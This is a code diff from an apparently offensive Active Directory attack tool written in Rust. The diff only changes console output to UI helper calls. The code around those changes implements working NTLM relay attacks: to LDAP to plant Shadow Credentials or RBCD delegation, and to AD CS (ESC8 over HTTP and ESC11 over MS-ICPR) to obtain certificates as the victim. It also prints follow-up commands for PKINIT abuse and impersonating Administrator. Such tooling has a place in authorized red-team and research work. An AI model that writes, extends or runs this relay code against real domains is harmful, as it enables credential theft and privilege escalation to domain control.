@@ -10,6 +10,8 @@
 //! (**1.4.8-D WS-LLMNR-POISON**) as the front-half that lures traffic to the
 //! listener.
 
+use crate::ui;
+use crate::ui::OutcomeKind;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -124,11 +126,19 @@ pub(crate) async fn relay(a: RelayArgs) -> Result<()> {
         .collect::<Vec<_>>()
         .join(",");
     let listener = RelayConn::listen(&a.listen).await?;
-    println!(
-        "[*] relay listening on {} → LDAP {} ({:?} on {})",
-        a.listen, a.target_dc, target, a.target_object
+    ui::verb_banner(
+        "attack relay",
+        &[
+            ("listen", a.listen.as_str()),
+            ("target-dc", a.target_dc.as_str()),
+            ("target-obj", a.target_object.as_str()),
+        ],
     );
-    println!("    now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
+    ui::info(&format!(
+        "relay listening on {} → LDAP {} ({:?})",
+        a.listen, a.target_dc, target
+    ));
+    ui::note("now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
     loop {
         let (stream, peer) = listener.accept().await?;
         let (target_dc, base, target_object, trustee, tgt) = (
@@ -150,7 +160,7 @@ pub(crate) async fn relay(a: RelayArgs) -> Result<()> {
             )
             .await
             {
-                println!("[-] relay from {peer} failed: {e}");
+                ui::bad(&format!("relay from {peer} failed: {e}"));
             }
         });
     }
@@ -189,13 +199,17 @@ async fn relay_one(
         return relay_icpr(rc, type1, peer, target_object, ca_host, template).await;
     }
 
-    println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
+    ui::info(&format!(
+        "victim {peer} started NTLM — relaying to {target_dc} LDAP"
+    ));
     let mut ld = adhammer_ldap::LdapClient::connect(&format!("{target_dc}:389")).await?;
     let type2 = ld.sasl_step1(&type1).await?; // target's challenge
     rc.send_challenge(&type2).await?; // → victim signs the target's challenge
     let type3 = rc.recv_type3().await?;
     ld.sasl_step2(&type3).await?; // now authenticated to the DC AS the victim
-    println!("[+] relayed bind to {target_dc} succeeded as the victim");
+    ui::ok(&format!(
+        "relayed bind to {target_dc} succeeded as the victim"
+    ));
     let dn = ld.find_dn(base, target_object).await?;
 
     match target {
@@ -212,8 +226,15 @@ async fn relay_one(
             )?;
             ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
                 .await?;
-            println!("[+] Shadow Credential written on {dn} — key {key_path}");
-            println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
+            let next = format!(
+                "attack abuse --action pkinit --target {target_object} --value {key_path} --realm <realm> --kdc {target_dc}"
+            );
+            ui::summary_box(
+                &dn,
+                OutcomeKind::Validated,
+                &[("key", key_path.as_str())],
+                Some(&next),
+            );
         }
         RelayAction::LdapRbcd => {
             let trustee = trustee_sid.expect("checked in relay(): --trustee-sid required");
@@ -222,13 +243,15 @@ async fn relay_one(
             let sd = windows_sddl::build_rbcd_sd(&trustee);
             ld.modify_add(&dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd)
                 .await?;
-            println!(
-                "[+] RBCD written on {dn} — trustee {} can now S4U2Proxy → any user on {target_object}",
-                trustee_sid.unwrap()
+            let trustee_str = trustee_sid.unwrap();
+            let msg = format!(
+                "RBCD written on {dn} — trustee {trustee_str} can now S4U2Proxy → any user on {target_object}"
             );
-            println!(
-                "    → attack rbcd --host <trustee-host> --target-spn cifs/{target_object} --target-user Administrator"
+            let next = format!(
+                "attack rbcd --host <trustee-host> --target-spn cifs/{target_object} --target-user Administrator"
             );
+            ui::ok(&msg);
+            ui::summary_box(&dn, OutcomeKind::Validated, &[], Some(&next));
         }
     }
     Ok(())
@@ -256,9 +279,9 @@ async fn relay_esc8(
         HttpsClient,
     };
 
-    println!(
-        "[+] victim {peer} started NTLM — relaying to https://{ca_host}:{ca_port}/certsrv/ (ESC8)"
-    );
+    ui::info(&format!(
+        "victim {peer} started NTLM — relaying to https://{ca_host}:{ca_port}/certsrv/ (ESC8)"
+    ));
     let mut http = HttpsClient::connect(ca_host, ca_port, insecure).await?;
 
     // Generate a fresh CSR; the subject is unused (the CA identifies the requester via the
@@ -320,7 +343,9 @@ async fn relay_esc8(
     }
     let html = String::from_utf8_lossy(&r2.body);
     let req_id = parse_request_id(&html).context("no ReqID in ASP response (submission failed)")?;
-    println!("[+] CA accepted submission — Request ID {req_id}, fetching certificate…");
+    ui::ok(&format!(
+        "CA accepted submission — Request ID {req_id}, fetching certificate…"
+    ));
 
     // Round 3: GET the issued cert. This may reuse the same connection or open a new one;
     // AD CS is happy with either — send unauthenticated (session already established), and if
@@ -343,9 +368,14 @@ async fn relay_esc8(
     };
     let cert_path = format!("{target_stem}.esc8.pem");
     std::fs::write(&cert_path, &cert_bytes)?;
-    println!("[+] certificate written to {cert_path} — key {key_path}");
-    println!(
-        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
+    let next = format!(
+        "attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
+    );
+    ui::summary_box(
+        peer,
+        OutcomeKind::Validated,
+        &[("cert", cert_path.as_str()), ("key", key_path.as_str())],
+        Some(&next),
     );
     Ok(())
 }
@@ -369,7 +399,9 @@ async fn relay_icpr(
 ) -> Result<()> {
     use dcerpc::{epm, icpr, transport::RpcTcp};
 
-    println!("[+] victim {peer} started NTLM — relaying to MS-ICPR at {ca_host} (ESC11)");
+    ui::info(&format!(
+        "victim {peer} started NTLM — relaying to MS-ICPR at {ca_host} (ESC11)"
+    ));
     let port = epm::resolve_port(ca_host, icpr::icpr_syntax()).await?;
     let mut rpc = RpcTcp::connect(&format!("{ca_host}:{port}")).await?;
 
@@ -378,7 +410,7 @@ async fn relay_icpr(
     rc.send_challenge(&type2).await?;
     let type3 = rc.recv_type3().await?;
     rpc.bind_relay_finish(&type3).await?;
-    println!("[+] relayed CONNECT-level bind to ICPR succeeded as the victim");
+    ui::ok("relayed CONNECT-level bind to ICPR succeeded as the victim");
 
     // Generate a fresh CSR and submit — the CA identifies the requester from the relayed
     // authentication, so no subject encoding is needed on our side.
@@ -414,9 +446,15 @@ async fn relay_icpr(
     let cert_pem = pem_wrap("CERTIFICATE", &result.cert_der);
     let cert_path = format!("{target_stem}.esc11.pem");
     std::fs::write(&cert_path, cert_pem.as_bytes())?;
-    println!("[+] ISSUED — certificate written to {cert_path} — key {key_path}");
-    println!(
-        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
+    let next = format!(
+        "attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
+    );
+    ui::ok("ISSUED");
+    ui::summary_box(
+        peer,
+        OutcomeKind::Validated,
+        &[("cert", cert_path.as_str()), ("key", key_path.as_str())],
+        Some(&next),
     );
     Ok(())
 }
